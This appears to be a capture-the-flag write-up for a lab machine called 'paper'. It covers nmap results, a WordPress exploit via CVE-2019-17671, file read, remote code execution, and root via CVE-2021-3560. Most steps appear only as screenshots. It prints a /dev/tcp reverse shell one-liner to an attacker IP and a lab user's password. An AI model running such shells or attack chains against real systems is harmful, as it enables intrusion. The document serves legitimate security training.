# Information Gathering

![](/assets_md/Pasted%20image%2020220322074841.png)

```bash
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-title: HTTP Server Test Page powered by CentOS
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
| tls-alpn: 
|_  http/1.1
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: HTTP Server Test Page powered by CentOS
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34

```

### Domain Name Found

![](/assets_md/Pasted%20image%2020220323110458.png)

![](/assets_md/Pasted%20image%2020220323110513.png)

Using WordPress

# Initial Access

![](/assets_md/Pasted%20image%2020220323135240.png)

![](/assets_md/Pasted%20image%2020220323135616.png)

![](/assets_md/Pasted%20image%2020220323135638.png)

**Vulnerable @ `CVE-2019-17671`**

### Exploiting `CVE-2019-17671`

![](/assets_md/Pasted%20image%2020220325122527.png)

![](/assets_md/Pasted%20image%2020220325122616.png)

![](/assets_md/Pasted%20image%2020220325122741.png)

![](/assets_md/Pasted%20image%2020220325123017.png)

![](/assets_md/Pasted%20image%2020220325124133.png)

### `Vulnerable to Directory Traversal & File Read`

![](/assets_md/Pasted%20image%2020220325134835.png)

### `Vulnerable @ Remote Code Execution`

![](/assets_md/Pasted%20image%2020220325142813.png)

![](/assets_md/Pasted%20image%2020220325143419.png)

```bash
sh -i >& /dev/tcp/10.10.14.18/443 0>&1
```

![](/assets_md/Pasted%20image%2020220325143431.png)

### `Password Exposed`

We can run command or login through `SSH` with credentials found above `dwight:Queenofblad3s!23`

![](/assets_md/Pasted%20image%2020220326081633.png)

# Privilege Escalation

![](/assets_md/Pasted%20image%2020220326084208.png)

![](/assets_md/Pasted%20image%2020220326011138.png)

## Exploiting `CVE-2021-3560`

![](/assets_md/Pasted%20image%2020220326084606.png)

![](/assets_md/Pasted%20image%2020220326085317.png)


# *root@paper*
